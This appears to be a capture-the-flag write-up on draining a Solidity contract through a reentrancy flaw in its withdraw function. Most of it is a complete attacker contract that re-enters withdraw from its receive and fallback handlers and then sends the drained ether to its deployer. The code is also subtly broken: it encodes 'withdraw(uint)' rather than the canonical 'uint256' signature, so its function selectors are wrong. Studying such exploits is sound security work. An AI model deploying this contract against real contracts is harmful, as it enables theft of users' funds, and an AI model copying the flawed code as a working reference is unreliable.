# Requirements

- Steal all the funds from the contract.

# Attack explanation

To steal all funds for the contract, we might use reentrancy attack. We need to spot a place where an external call transfering eth is happening before updating state variables.

Our vulnerability exploiting candidate is withdraw function:

```
function withdraw(uint _amount) public {
  if(balances[msg.sender] >= _amount) {
    (bool result,) = msg.sender.call{value:_amount}("");
    if(result) {
      _amount;
    }
    balances[msg.sender] -= _amount;
  }
}
```

This function is vulnerable to reentrancy attack, because it is calling and external source before updating internal contract state.

# Attack function

We could solve the challenge by just using the following attack proxy sc:

```
contract MaliciousContract {
  address payable public vulnerableScAddress;
  address payable public attacker;
  uint256 public constant attackValue = 0.001 ether;

  constructor(address _vulnerableScAddress) payable {
      vulnerableScAddress = payable(_vulnerableScAddress);
      attacker = payable(msg.sender);
  }

  receive() external payable {
      if (vulnerableScAddress.balance >= attackValue) {
          vulnerableScAddress.call(
              abi.encodeWithSignature("withdraw(uint)", attackValue)
          );
      }
  }

  fallback() external payable {
      if (vulnerableScAddress.balance >= attackValue) {
          vulnerableScAddress.call(
              abi.encodeWithSignature("withdraw(uint)", attackValue)
          );
      }
  }

  function attack() public payable {
      require(msg.value >= attackValue, "Need to send at least 0.001 eth.");
      // Donates minimum funds to be able to pass if(balances[msg.sender] >= _amount) control
      vulnerableScAddress.call{value: attackValue}(
          abi.encodeWithSignature("donate(address)", address(this))
      );

      // Triggers withraw vulnerability.
      vulnerableScAddress.call(
          abi.encodeWithSignature("withdraw(uint)", attackValue)
      );
  }

  function claimAndRun() public {
      require(msg.sender == attacker, "not your bounty, buddy.");
      attacker.transfer(address(this).balance);
  }
}
```
